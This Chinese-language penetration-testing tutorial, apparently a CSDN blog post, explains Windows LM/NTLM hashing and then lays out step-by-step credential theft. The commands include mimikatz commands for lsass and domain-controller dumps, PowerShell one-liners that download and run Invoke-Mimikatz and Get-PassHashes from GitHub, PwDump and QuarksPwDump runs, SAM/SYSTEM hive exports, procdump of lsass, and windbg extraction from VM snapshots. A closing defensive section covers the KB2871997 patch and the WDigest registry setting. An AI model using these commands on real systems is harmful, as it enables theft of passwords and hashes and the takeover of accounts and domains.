**目录**

[Windows中对用户密码的处理](#t0)

[LM-hash](#t1)

[NTLM-hash](#t2)

[复制SAM文件](#t3)

[抓取明文密码或密码Hash](#t4)

[使用 mimikatz 抓取内存中的密码](#t5)

[使用mimikatz读取域控上所有域用户的Hash值](#t6)

[使用PowerShell命令抓取内存中的密码](#t7)

[PwDump7抓取密码Hash](#t8)

[QuarksPwDump抓取密码Hash](#t9)

[通过SAM和System文件读取密码Hash](#t10)

[使用mimikatz离线读取lsass.dmp文件](#t11)

[从快照内存中读取密码](#t12)

[管理员如何防止主机密码被抓取(KB2871997补丁)](#t13)

* * *

Windows中对用户密码的处理
----------------

Windows系统使用两种方法对用户的密码进行哈希处理，它们分别是 **LAN Manager（LM）**哈希和 **NT LAN Manager（NTLM**）哈希。所谓哈希（[hash](https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020)），就是使用一种加密函数对其进行加密。这个加密函数对一个任意长度的字符串数据进行一次数学加密函数运算，然后返回一个固定长度的字符串。

现在已经有了更新的 **NTLMv2** 以及 **Kerberos(域环境)** 验证体系。Windows加密过的密码口令，我们称之为Hash，Windows的系统密码hash默认情况下一般由两部分组成：第一部分是 LM-hash，第二部分是 NTLM-hash。在windows2000以后的系统中，第一部分的 LM-hash 都是空值，因为LM-hash可以很容易的破解，所以windows2000之后这个值默认为空，所以第二部分的NTLM-hash才真正是用户密码的哈希值。

通常可从Windows系统中的SAM文件 和 域控的 **NTDS.dit** 文件中获得所有用户的hash，通过Mimikatz读取lsass.exe进程能获得已登录用户的NTLM hash

这个网站提供对密码转换成 LM-Hash 和 NTLM-Hash 的操作：[https://asecuritysite.com/encryption/lmhash](https://asecuritysite.com/encryption/lmhash "https://asecuritysite.com/encryption/lmhash")

### **LM-hash**

**LAN Manager（LM）**哈希是Windows系统所用的第一种密码哈希算法。LM Hash本质是DES加密，尽管LM Hash较容易被破解，但为了保证系统的兼容性，Windows只是将LM Hash禁用了(从Windwos Vista和Windows Server 2008开始，Windows默认禁用了LM Hash)。LM Hash明文密码被限定在14位以内，也就是说，如果要停止使用LM Hash，将用户的密码设置为14位以上即可。它只有唯一一个版本且一直用到了NTLM Hash的出现，个人版Windows Vista之前(不包括Vista)，服务器Windows Server 2003之前(不包括Server 2003)，Windows操作系统认证方式才为LM Hash。

如果LM Hash的值为：aad3b435b51404eeaad3b435b51404ee，说明LM Hash为空值或者被禁用了。

**LM加密过程**

1.  口令大写         
2.  转换为HEX         
3.  用0补齐14字节（112bit）         
4.  两组分组         
5.  每组7字节HEX转为二进制，每7bit一组末尾加0，再转换成十六进制组成得到2组8字节的编码         
6.  两组8字节编码，分别作为DES加密key为字符串“KGS!@#$% ”进行加密         
7.  两组DES加密后的编码拼接

注：自Windows2000以后的 windows 系统都是用 NTLM-hash 处理用户的密码

### **NTLM-hash**

**New Technology** **LAN Manager**（NTLM）哈希算法是微软认可的另一种算法。而NTLM Hash是微软为了在提高安全性的同事保证兼容性而设计的散列加密算法。NTLM Hash是基于MD4加密算法进行加密的。个人版从Windows Vista以后，服务器从Windows Server 2003以后，Windows操作系统的认证方式均为NTLM Hash。

**NTLM加密过程**

1.  密码换成HEX         
2.  HEX字符串进行ASCII转Unicode         
3.  Unicode字符串进行标准MD4单向哈希加密

在线NTLM加密的网站：[NTLM密码加密计算器](https://www.jisuan.mobi/p11BbzHum6b3uyJW.html "NTLM密码加密计算器")、[在线LM/NTLM计算器](https://www.tobtu.com/lmntlm.php "在线LM/NTLM计算器")

![](https://img-blog.csdnimg.cn/20190107102234437.png)

如图，第三部分是LM-Hash(可以看到已经禁用了)，第四部分是NTLM-Hash。目前的LM-hash是空值，所以第四部分的NTLM-hash才是用户密码的哈希值。 

相关文章：[哈希传递攻击(Pass-the-Hash,PtH)](https://blog.csdn.net/qq_36119192/article/details/103941590 "哈希传递攻击(Pass-the-Hash,PtH)")

LM和NTLM解密，我们可以使用类似John这样的工具来破解密码：[John破解Windows系统密码](https://xie1997.blog.csdn.net/article/details/83373895#%E7%A0%B4%E8%A7%A3Windows%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81 "John破解Windows系统密码")，或者使用在线网站解密：[md5在线解密破解,md5解密加密](https://www.cmd5.com/default.aspx "md5在线解密破解,md5解密加密")

![](https://img-blog.csdnimg.cn/20200927210242966.png)

复制SAM文件
-------

SAM文件即账号密码数据库文件。 当我们登录系统的时候，系统会自动地和 C:\\Windows\\System32\\config\\SAM 中的SAM文件自动校对，如发现此次密码与SAM文件中的加密数据符合时，你就会顺利登录;如果错误则无法登录。在系统运行期间，SAM文件一直是被占用的，是无法打开和编辑复制的。但是，我们可以通过以下方法进行复制SAM文件，

**方法一：我们可以进入PE系统进行复制**

*   U盘启动，运行DiskGenius分区工具
*   找到 SAM 文件，复制到U盘
*   在另一台电脑上下载软件 NTPWedit 并运行，打开 SAM 文件，解锁并修改密码
*   把 SAM 文件复制到原来的电脑上，覆盖原文件

注意：这样只能修改密码，并不能知道密码的明文

**方法二：利用Copy-VSS.ps1脚本**

利用nishang框架内的Copy-VSS.ps1脚本

```
Import-Module .\Copy-VSS.ps1;copy-vss
```


![](https://img-blog.csdnimg.cn/20200208195131986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

抓取明文密码或密码Hash
-------------

### 使用 mimikatz 抓取内存中的密码

 mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程[内存](https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020)，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！

**注：**但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了，除非修改注册表，然后用户在重新登录。mimikatz的使用需要administrator用户执行，管理员组内的其他用户都不行。

```
下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行      
提升至debug权限在提示符下，输入：privilege::debug      
抓取密码： sekurlsa::logonpasswords
```


![](https://img-blog.csdn.net/20181015160308972?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

### **使用mimikatz读取域控上所有域用户的Hash值**

注：得在域控上以域管理员身份执行mimikatz

```
提升至debug权限在提示符下，输入：privilege::debug      
抓取密码： lsadump::lsa /patch
```


![](https://img-blog.csdnimg.cn/20190621094645345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)![](https://img-blog.csdnimg.cn/20190621094734865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 使用PowerShell命令抓取内存中的密码

**读取密码明文(需要管理员权限)**

```
#远程读取      
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds       
#本地导入读取      
Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -DumpCreds
```


![](https://img-blog.csdnimg.cn/20200421192459629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200421192548146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**读取密码hash值(需要管理员权限)**

```
#远程读取      
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes       
#本地读取      
Import-Module .\Get-PassHashes.ps1;Get-PassHashes
```


![](https://img-blog.csdnimg.cn/20190621175208620.png)

### PwDump7抓取密码Hash

需要管理员权限

```
PwDump7.exe
```


![](https://img-blog.csdnimg.cn/20200205114723994.png)

### QuarksPwDump抓取密码Hash

需要管理员权限

```
QuarksPwDump.exe --dump-hash-local
```


![](https://img-blog.csdnimg.cn/20200205114525584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 通过SAM和System文件读取密码Hash

需要管理员权限执行，通过reg的save选项将注册表中的SAM、System文件导出到本地磁盘。

```
reg save hklm\sam sam.hive      
reg save hklm\system system.hive
```


![](https://img-blog.csdnimg.cn/20200205145555319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**使用mimikatz从sam.hive和system.hive文件中获得NTLM Hash**

```
lsadump::sam /sam:sam.hive /system:system.hive
```


![](https://img-blog.csdnimg.cn/20200205145948937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**也可以直接使用mimikatz读取本地SAM文件内容，读取密码Hash**

```
privilege::debug      
token::elevate      
lsadump::sam
```


![](https://img-blog.csdnimg.cn/20200205150444768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 使用mimikatz离线读取lsass.dmp文件

**方法一**：在任务管理栏中找到lsass.exe进程，右键 Create [Dump](https://so.csdn.net/so/search?q=Dump&spm=1001.2101.3001.7020) File(创建转储文件)，如果，将导出lsass.DMP文件

![](https://img-blog.csdnimg.cn/20200205150919891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**方法二**：使用Procdump导出lsass.dmp文件

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```


![](https://img-blog.csdnimg.cn/20200205151318229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**然后使用mimikatz读取lsass.dmp文件**

```
sekurlsa::minidump lsass.dmp      
sekurlsa::logonpasswords full
```


![](https://img-blog.csdnimg.cn/20200205151640580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 从快照内存中读取密码

我们都知道虚拟机有拍摄快照的功能。拍摄快照的瞬间虚拟机就会把你当前的内存保存为一个文件，文件以 .vmem 结尾，该文件的大小就是你虚拟机的内存大小。我们现在要从快照内存中读取出密码。

首先，利用 Bin2Dmp将该内存文件转成dmp文件，

```
Bin2Dmp.exe "Windows 7 x64-381e3888.vmem" windows7.dmp
```


![](https://img-blog.csdnimg.cn/20181129181435565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后我们在 windbg 中载入该文件 

![](https://img-blog.csdnimg.cn/20181129183533671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

依次在 kd>  中输入下面的命令 

```
.symfix     #设置符号路径       
.reload     #重新载入      
.load  D:\mimikatz\x64\mimilib.dll   #这个路径是你mimikatz的路径      
!process 0 0 lsass.exe      #查找lsass进程，并将该进程转到本机环境中      
.process /r /p fffffa801ae19060            #这里的fffffa801ae19060 是上一步查找lsass进程的地址，注意替换      
!mimikatz        #载入mimikatz，读取密码
```


可以看到，已经读取出密码来了 

![](https://img-blog.csdnimg.cn/20181129183252423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

管理员如何防止主机密码被抓取(KB2871997补丁)
---------------------------

微软为了防止用户密码在内存中一明文形式泄露，发布了补丁KB2871997，关闭了Wdigest功能。

Windows Server2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。Windows Server2012以下版本，如果安装了KB2871997补丁，攻击者同样无法获取明文密码。

在日常网络维护中，通过查看注册表项Wdigest，可以判断Wdigest功能的状态。如果该项的值为1，用户下次登录时，攻击者就能使用工具获取明文密码。应该确保该项的值为0，使用户明文密码不会出现在内存中。

在命令行环境开启或关闭Wdigest Auth，有如下两种方法：

**1：使用 red add命令**

```
开启Wdigest Auth，命令如下      
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f       
关闭Wdigest Auth，命令如下      
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```


**2：使用PowerShell**

```
开启Wdigest Auth      
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1      
关闭Wdigest Auth      
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0
```


需要强调的是，安装了 KB2871997补丁，黑客不仅无法dump出明文密码，并且一般情况下无法使用哈希传递攻击。仅可以使用SID=500的用户进行哈希传递攻击，而SID=500的用户默认为administrator。所以，主机管理员最好也禁用administrator用户。

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章：[更新KB2871997补丁产生的影响](https://blog.csdn.net/qq_36119192/article/details/103941590#%E6%9B%B4%E6%96%B0KB2871997%E8%A1%A5%E4%B8%81%E4%BA%A7%E7%94%9F%E7%9A%84%E5%BD%B1%E5%93%8D "更新KB2871997补丁产生的影响")

相关文章：[域渗透——Dump Clear-Text Password after KB2871997](http://www.vuln.cn/6811 "域渗透——Dump Clear-Text Password after KB2871997")